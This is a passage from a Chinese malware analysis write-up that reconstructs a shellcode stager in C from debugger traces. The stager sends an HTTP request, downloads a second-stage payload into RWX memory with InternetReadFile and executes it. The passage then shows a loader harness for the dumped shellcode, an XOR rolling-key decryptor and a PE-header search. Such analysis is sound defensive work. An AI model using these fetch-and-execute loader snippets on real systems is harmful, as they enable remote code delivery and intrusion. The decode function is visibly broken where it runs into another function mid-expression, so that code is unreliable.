    push edi    //edi == 0
    push edi
    push 0xFFFFFFFF     //请求头长度，-1就当成ascii字符串到\0结束
    push ebx    //User-Agent，请求头信息等
    push esi    //上次调用返回的句柄
    push 0x7B18062D
    call ebp
    //eax=
    //执行函数
    CHAR header[] = "User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0)\n\r";
    HttpSendRequestA(hInternet, header, -1, NULL, 0);
这次调用发送了http请求
**第六次调用**
    push 0x315E2145
    call ebp
    //eax=
    //执行函数
    HWND hWnd = GetDesktopWindow();
**第七次调用**
    push edi
    push 0x7
    push ecx
    push esi
    push eax
    push 0xBE057B7
    call ebp
    //eax=
    //执行函数
    InternetErrorDlg(hWnd, hInternet, xxx, 0x7, NULL);
会判断是否返回`ERROR_INTERNET_FORCE_RETRY`，0x2F00，没有问题继续调用
**第八次调用**
    push 0x40
    push 0x1000
    push 0x400000   //分配一整个物理页，小页4kb
    push edi    //edi == 0
    push E553A458
    call ebp
    //eax=
    //函数执行
    LPVOID target = VirtualAlloc(0,0x400000,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
这次调用开始就进入关键步骤了，看到了老演员，开始分配内存，那可以推断出后面就是写内容到内存进而进一步执行。
**第九次调用**
    push ecx    //保存环境
    push ebx    
    mov edi,esp
    //函数开始位置
    push edi    //
    push 2000
    push ebx
    push esi
    push E2899612
    call ebp
    //eax=
循环读取internet请求的内容到分配的内存中，直到读取不到为止，edi指向的地址就是每次读取的到字节数  
代码表示类似于如下情况：
    LPVOID target = VirtualAlloc(0, 0x400000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    DWORD realRead = 0;
    BOOL bRes = 0;
    do
    {
        bRes = InternetReadFile(hInternet, target, 0x2000, &realRead);
        if (bRes == FALSE)
        {
            break;
        }
        target = (LPVOID)((DWORD)target+0x2000);
    } while (realRead != 0);
最后通过retn调回到栈顶的地址，也就是新加载到内存中的shellcode的首地址，至此第一阶段结束。
## 2.第二阶段
第二阶段主要就是执行从远程加载到内存的shellcode，会有一些解密处理，还有一些跟第一阶段相似的内容，我们来看一看吧
### 2.1动态解密
为了方便，我们利用x64dbg把第一阶段加载到内存的shellcode，dump到本地文件（具体方法，下一段dump有写），然后重新开一个程序，以读取文件到内存的方式进行加载执行  
以如下代码作为开始：
    void start2nd()
    {
        HANDLE hfile = CreateFileA("1.mem", FILE_ALL_ACCESS, 0, NULL, 
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        LPVOID buffer = VirtualAlloc(NULL, 0x4000000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        DWORD realRead = 0;
        ReadFile(hfile, buffer, 0x4000000,&realRead, NULL);
        ((void(*)())buffer)();
    }
首先经过一段反复横跳，获取开始执行解密代码的EIP，然后就进入了如图所示的解密部分。  
其中ESI寄存器，存储的是首次位置，也就是图中标着“钥匙”的位置  
然后用“钥匙”跟第二个DWORD（4个字节）求异或得到了解密长度，存放在了edx寄存器中  
然后便开始从第三个DWORD开始解密  
**解密方式：**  
新数据 = 旧钥匙 ^ 旧数据  
新钥匙 = 新数据 ^ 旧钥匙
**等价于：**  
新数据 = 旧钥匙 ^ 旧数据  
新钥匙 = 旧数据
代码类似如下：
    void decode(DWORD*start)
    {
        DWORD *begin = start;
        DWORD key = begin[0];
        DWORD len = begin[1] ^ begin[0];
        begin = begin + 2;
        for (int i = 0; i =0x40 && e_lfanew < 0x400)
                {
                    DWORD* ntHead = (DWORD*)((DWORD)begin + e_lfanew);
                    if (*ntHead == 0x4550)
                    {
                        target = begin;
                        break;
                    }
                }
            }
            begin++;
        }
        return target;
    }
### 2.3获取api
当找到了PE文件的位置，为了进一步处理，一定是需要一些系统API辅助，所以，就进入了下一个call，这个call传入了一个地址（就是一开始没理解的云里雾里的一段），这里我推测这是一个数组，是用来盛装找到的api地址  
然后我们跟进去  